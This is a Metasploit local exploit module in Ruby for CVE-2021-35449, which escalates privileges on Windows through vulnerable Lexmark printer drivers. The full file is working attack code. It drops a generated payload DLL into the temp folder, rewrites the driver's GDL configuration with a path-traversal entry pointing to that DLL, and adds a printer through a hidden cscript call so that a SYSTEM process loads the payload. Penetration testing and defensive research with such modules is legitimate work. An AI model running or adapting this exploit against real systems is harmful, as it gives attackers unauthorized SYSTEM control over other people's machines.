##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Lexmark Driver Privilege Escalation',
        'Description' => %q{
          Various Lexmark printer drivers allow escalation of
          privileges on Windows systems.

          For vulnerable drivers, a low-privileged user can
          modify an XML configuration file and replace a
          DLL path with a malicious DLL path.

          `PrintIsolationHost.exe`, a Windows process running
          as NT AUTHORITY\SYSTEM, loads driver-specific DLLs
          during the installation of a printer. A user can
          elevate to SYSTEM by writing a malicious DLL to
          the vulnerable configuration file and adding a new
          printer with a vulnerable driver.

          This module leverages the `prnmngr.vbs` script
          to add and delete printers.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jacob Baines', # discovery, PoC, module
          'Shelby Pace' # original Ricoh driver module
        ],
        'References' =>
          [
            [ 'CVE', '2021-35449'],
            [ 'URL', 'http://support.lexmark.com/index?page=content&id=TE953']
          ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Platform' => 'win',
        'Payload' =>
        {
        },
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' =>
          [
            [
              'Windows', { 'Arch' => [ ARCH_X86, ARCH_X64 ] }
            ]
          ],
        'Notes' =>
        {
          'SideEffects' => [ ARTIFACTS_ON_DISK ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ SERVICE_RESOURCE_LOSS ]
        },
        'DisclosureDate' => '2021-07-15',
        'DefaultTarget' => 0
      )
    )

    self.needs_cleanup = true
  end

  def check
    # The driver only really needs to be in the driver store for us to install/exploit.
    # But this is a reasonable method to determine if the printer has been installed.
    # Unfortunately, the patch didn't alter permissions on the file.
    @gdl_file = 'C:\\ProgramData\\Lexmark Universal v2\\Universal Color Laser.gdl'
    return CheckCode::Safe('No Lexmark GDL file found') unless file?(@gdl_file)

    vprint_status("Vulnerable Lexmark file: #{@gdl_file}")
    CheckCode::Appears('Lexmark GDL file is present')
  end

  def add_printer(driver_name)
    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(@script_path)

    # dump exploit dll to disk
    dll_data = generate_payload_dll
    temp_path = expand_path('%TEMP%\\')
    temp_path.concat(Rex::Text.rand_text_alpha(5..9))
    temp_path.concat('.dll')
    vprint_status("Writing dll to #{temp_path}")
    write_file(temp_path, dll_data)
    register_files_for_cleanup(temp_path)

    # replace a DLL path to one in our control
    traversal_path = '..\\..\\..\\..\\..\\..'
    traversal_path.concat(temp_path[2..-1])
    text = read_file(@gdl_file)
    new_contents = text.gsub(/LMUD1OUE.DLL/, traversal_path)
    write_file(@gdl_file, new_contents)

    # trigger exploitaiton
    script_cmd = "cscript \"#{@script_path}\" -a -p \"#{@printer_name}\" -m \"#{driver_name}\" -r \"lpt1:\""
    print_status("Adding printer #{@printer_name}...")
    client.sys.process.execute(script_cmd, nil, { 'Hidden' => true })

    # reset the path
    text = read_file(@gdl_file)
    new_contents = text.gsub(traversal_path, 'LMUD1OUE.DLL')
    write_file(@gdl_file, new_contents)
  rescue Rex::Post::Meterpreter::RequestError => e
    e_log("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
  end

  def exploit
    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?

    fail_with(Failure::None, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'

    if sysinfo['Architecture'] != payload.arch.first
      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target driver')
    end

    @printer_name = Rex::Text.rand_text_alpha(5..9)
    @script_path = 'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs'
    drvr_name = 'Lexmark Universal v2'
    add_printer(drvr_name)
  end

  def cleanup
    print_status("Deleting printer #{@printer_name}")
    Rex.sleep(3)
    delete_cmd = "cscript \"#{@script_path}\" -d -p \"#{@printer_name}\""
    client.sys.process.execute(delete_cmd, nil, { 'Hidden' => true })
  end
end
